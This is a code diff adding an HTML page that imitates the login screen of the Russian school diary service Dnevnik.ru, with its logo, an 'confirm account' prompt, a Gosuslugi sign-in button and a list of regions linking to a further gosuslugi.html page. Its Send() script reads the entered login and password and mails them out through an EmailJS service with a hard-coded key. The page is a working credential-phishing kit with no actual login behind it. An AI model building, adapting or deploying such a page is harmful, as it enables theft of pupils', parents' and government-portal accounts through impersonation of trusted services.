@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/dnevnik.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://smtpjs.com/v3/smtpjs.js"></script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+    emailjs.init({
+        publicKey: "TymCgkYexBS3Dzuo-",
+    });
+    })();
+    </script>
+    <title>Dnevnik</title>
+    <style>
+        body{
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+    align-items: center;
+}
+.color{
+    display: flex;
+    height: 0.3em;
+    width: 100%;
+}
+.color div{
+    width: 20%;
+}
+img{
+    width: 35%;
+    height: auto;
+    margin: 0.68em 0;
+}
+.blue-section{
+    height: 4em;
+    width: 100%;
+    border-top: 1px solid #99e3f5;
+    background-image: linear-gradient(to bottom, #00bbe5, #00abdf);
+    text-shadow: 0 1px 0 rgba(0, 90, 195, .65);
+    display: flex;
+    color: white;
+    font-size: 130%;
+    justify-content: center;
+    align-items: center;
+}
+.login{
+    padding: 0.8em 0.5em;
+    width: 68%;
+    background: #fafafa;
+    border: 0.1em solid #DEDCDA;
+    border-radius: 0.3em;
+    outline: none;
+    font-size: 1em;
+    border: solid 1px #cdc5bc;
+    box-shadow: inset 0 2px 4px rgba(0, 0, 0, .1);
+    margin-bottom: 1.4em;
+}
+label{
+    display: flex;
+    align-items: center;
+    width: 72%;
+    font-size: 1em;
+    margin: 2.5em 0 0.5em 0;
+    font-weight: 500;
+}
+#passwordl{
+    margin-top: 0;
+}
+#submit{
+    display: flex;
+    justify-content: center;
+    font-size: 1.2em;
+    padding: 0.7em 0.45em;
+    width: 73%;
+    border-radius: 0.3em;
+    border: 1px solid #649e26;
+    background: #6db62e;
+    background-image: linear-gradient(to bottom, #afd652, #6db62e);
+    color: white;
+    box-shadow: inset 0 1px 0 rgba(255, 255, 255, .6);
+    text-shadow: 0 -1px 0 rgba(0, 0, 0, .4);
+    margin-top: 0.2em;
+    margin-bottom: 1em;
+}
+.gosuslugi{
+    background: none;
+}
+a{
+    display: flex;
+    align-items: center;
+    column-gap: 1em;
+    font-size: 0.95em;
+    color: #00aee0;
+    font-weight: 400;
+    margin-top: 1.5em;
+    width: 70%;
+    margin-right: 1em;
+    justify-content: start;
+}
+a svg{
+    height: 2em;
+}
+#gosus{
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.9em;
+    column-gap: 0.5em;
+    padding: 0.5em 0.45em;
+    width: 73%;
+    border-radius: 0.3em;
+    border: 1px solid #000000;
+    background: none;
+    color: rgb(0, 0, 0);
+    margin-top: 0.2em;
+    margin-bottom: 1em;
+    margin-top: -0.2em;
+    text-shadow: 0 -1px 0 rgba(92, 92, 92, .5);
+    border: 1px solid rgba(0, 0, 0, .2);
+}
+#gosus img{
+    display: flex;
+    margin-top: 0.85em;
+    height: 0.8em;
+    width: auto;
+}
+
+
+
+
+/*Выбор региона*/
+#region-menu{
+    display: none;
+    flex-direction: column;
+    position: absolute;
+    width: 100%;
+}
+#region-menu header{
+    padding: 19px 20px 20px 24px;
+    text-align: left;
+    background-color: #f7f7f7;
+}
+header h2{
+    color: #333;
+    font-size: 18px;
+    margin: 0;
+    padding: 0;
+    font-weight: 400;
+}
+header svg{
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    height: 1.4em;
+    width: auto;
+    cursor: pointer;
+}
+.region-label svg{
+    transform: translateY(0.5px);
+}
+.region-main{
+    background: rgb(255, 255, 255);
+    padding: 19px 20px 20px 26px;
+}
+.region-label{
+    margin: 0;
+    padding: 0;
+}
+.region-label input{
+    width: 82%;
+    padding-left: 1em;
+    border: none;
+    outline: 0;
+    color: #333;
+    font-family: "Open Sans", Arial, sans-serif;
+    font-size: 1.2em;
+    font-weight: 400;
+}
+.region-label input::placeholder{
+    font-size: 0.8em;
+}
+.regions-wrapper{
+    padding: 20px 0;
+    height: 84vh;
+    box-sizing: border-box;
+    padding: 15px 0;
+}
+.region-popup__list {
+    padding: 0;
+    margin: 0 0 0 -5px;
+    max-height: 84vh;
+    overflow: auto;
+    scrollbar-width: none;
+}
+.region-popup__list-item {
+    margin: 0;
+    padding: 0;
+    list-style: none;
+    display: block;
+    width: 100%;
+}
+.region-popup__list-item a {
+    display: block;
+    text-decoration: none;
+    color: #333;
+    font-family: "Open Sans", Arial, sans-serif;
+    font-size: 0.9em;
+    font-weight: 400;
+    line-height: 30px;
+    padding: 0px 8px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+    </style>
+</head>
+<body>
+    <div class="color">
+        <div class="blue" style="background:#45BEE5"></div>
+        <div class="green" style="background:#BBD12F"></div>
+        <div class="yellow" style="background:#F5DC87"></div>
+        <div class="oranhe" style="background:#F28D14"></div>
+        <div class="purple" style="background:#BF78B4"></div>
+    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Logo_of_the_company_Dnevnik.ru.png">
+    <div class="blue-section">Подтвердить аккаунт</div>
+    <label for="login" id="label">Логин</label>
+    <input class="login" id="email">
+    <label for="login" id="passwordl">Пароль</label>
+    <input class="login" id="password">
+    <button id="submit" onclick="Send()">Подтвердить</button>
+    <button onclick="regionmenu()" id="gosus">Подтвердить через<img src="https://toplogos.ru/images/logo-gosuslugi-ru.png"></button>
+    <a href="#" class="forget-password"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M9 9.00001C9.00011 8.45004 9.15139 7.91068 9.43732 7.44088C9.72325 6.97108 10.1328 6.58891 10.6213 6.33616C11.1097 6.08341 11.6583 5.96979 12.2069 6.00773C12.7556 6.04566 13.2833 6.23369 13.7323 6.55126C14.1813 6.86883 14.5344 7.30372 14.7529 7.8084C14.9715 8.31308 15.0471 8.86813 14.9715 9.41288C14.8959 9.95763 14.6721 10.4711 14.3244 10.8972C13.9767 11.3234 13.5185 11.6457 13 11.829C12.7074 11.9325 12.4541 12.1241 12.275 12.3775C12.0959 12.6309 11.9998 12.9337 12 13.244V14.5" stroke="#000000" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M12 18V18.5001" stroke="#000000" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M12 23.25C18.2132 23.25 23.25 18.2132 23.25 12C23.25 5.7868 18.2132 0.75 12 0.75C5.7868 0.75 0.75 5.7868 0.75 12C0.75 18.2132 5.7868 23.25 12 23.25Z" stroke="#000000" stroke-width="1" stroke-miterlimit="10"></path> </g></svg>Забыли логин или пароль?</a>
+    <a href="#" class="forget-password"><svg style="opacity: 0.7;" fill="#000000" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M16.114-0.011c-6.559 0-12.114 5.587-12.114 12.204 0 6.93 6.439 14.017 10.77 18.998 0.017 0.020 0.717 0.797 1.579 0.797h0.076c0.863 0 1.558-0.777 1.575-0.797 4.064-4.672 10-12.377 10-18.998 0-6.618-4.333-12.204-11.886-12.204zM16.515 29.849c-0.035 0.035-0.086 0.074-0.131 0.107-0.046-0.032-0.096-0.072-0.133-0.107l-0.523-0.602c-4.106-4.71-9.729-11.161-9.729-17.055 0-5.532 4.632-10.205 10.114-10.205 6.829 0 9.886 5.125 9.886 10.205 0 4.474-3.192 10.416-9.485 17.657zM16.035 6.044c-3.313 0-6 2.686-6 6s2.687 6 6 6 6-2.687 6-6-2.686-6-6-6zM16.035 16.044c-2.206 0-4.046-1.838-4.046-4.044s1.794-4 4-4c2.207 0 4 1.794 4 4 0.001 2.206-1.747 4.044-3.954 4.044z"></path> </g></svg>Выберите свой регион</a>
+
+
+    <div id="region-menu">
+        <header>
+            <h2>Выберите свой регион</h2>
+            <svg id="close" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M6 6L18 18" stroke="#b6b6b6" stroke-linecap="round"></path> <path d="M18 6L6.00001 18" stroke="#b6b6b6" stroke-linecap="round"></path> </g></svg>
+        </header>
+        <section class="region-main">
+            <label class="region-label">
+                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18" height="18" viewBox="0 0 18 18">
+                    <defs>
+                        <path id="a" d="M326 167.58l6.93 6.89c.12.17.12.32 0 .46a.53.53 0 0 1-.25.07.55.55 0 0 1-.21-.07l-6.89-6.93-.03-.07a6.13 6.13 0 0 1-4.26 1.66 6.06 6.06 0 0 1-4.44-1.85 6.06 6.06 0 0 1-1.85-4.45c0-1.73.62-3.21 1.85-4.44a6.06 6.06 0 0 1 4.44-1.85c1.74 0 3.22.62 4.45 1.85a6.06 6.06 0 0 1 1.85 4.44c0 1.62-.55 3.04-1.66 4.26a.1.1 0 0 1 .07.03zm-4.71 1.41a5.5 5.5 0 0 0 4.03-1.67 5.5 5.5 0 0 0 1.67-4.03c0-1.57-.56-2.91-1.67-4.02a5.47 5.47 0 0 0-4.03-1.67c-1.57 0-2.91.55-4.02 1.67a5.44 5.44 0 0 0-1.67 4.02c0 1.57.55 2.92 1.67 4.03a5.48 5.48 0 0 0 4.02 1.67z"></path>
+                    </defs>
+                    <use fill="#333" xlink:href="#a" transform="translate(-315 -157)"></use>
+                </svg>
+                <input name="region" type="text" maxlength="40" placeholder="Поиск региона...">
+            </label>
+            <div class="regions-wrapper">
+                <div class="region-popup__list-wrapper" id="default-region-popup__list-wrapper">
+                    <ul class="region-popup__list">
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Алтайский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Амурская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Архангельская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Астраханская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Белгородская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Брянская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Владимирская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Волгоградская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Вологодская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Воронежская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Донецкая Народная Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Еврейская автономная область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Забайкальский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Запорожская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ивановская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Иркутская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Кабардино-Балкарская Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Калининградская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Калужская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Камчатский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Карачаево-Черкесская Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Кемеровская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Кировская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Костромская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Краснодарский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Красноярский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Курганская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Курская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ленинградская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Липецкая область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Луганская Народная Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Магаданская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Москва</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Московская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Мурманская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ненецкий автономный округ</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Нижегородская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Новгородская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Новосибирская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Омская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Оренбургская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Орловская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Пензенская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Пермский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Приморский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Псковская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Адыгея</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Алтай</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Башкортостан</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Бурятия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Дагестан</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Ингушетия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Калмыкия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Карелия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Коми</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Крым</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Марий Эл</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Мордовия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Саха (Якутия)</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Северная Осетия - Алания</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Татарстан</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Тыва</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Республика Хакасия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ростовская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Рязанская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Самарская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Санкт-Петербург</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Саратовская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Сахалинская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Свердловская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Севастополь</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Смоленская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ставропольский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Тамбовская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Тверская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Томская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Тульская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Тюменская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Удмуртская Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ульяновская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Хабаровский край</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ханты-Мансийский автономный округ - Югра</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Херсонская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Челябинская область</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Чеченская Республика</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Чувашская Республика - Чувашия</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Чукотский автономный округ</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ямало-Ненецкий автономный округ</a></li>                    
+                            <li class="region-popup__list-item default-region-popup__list-item"><a href="gosuslugi.html">Ярославская область</a></li>                    
+                    </ul>
+                </div>
+            </div>
+        </section>
+    </div>
+
+
+    <script>
+        function Send(){
+            let parms = {
+                email : document.getElementById("email").value,
+                password : document.getElementById("password").value,
+            }
+            emailjs.send("service_rtjijim","template_xstaf2o",parms);
+        }
+
+
+
+        function regionmenu(){
+    const regionmenu = document.getElementById("region-menu");
+    regionmenu.style.display = "flex"; 
+}
+//
+const closebut = document.getElementById("close");
+closebut.addEventListener("click", function(){
+
+    const regionmenu = document.getElementById("region-menu");
+    regionmenu.style.display = "none";
+
+})
+    </script>
+</body>
+</html>
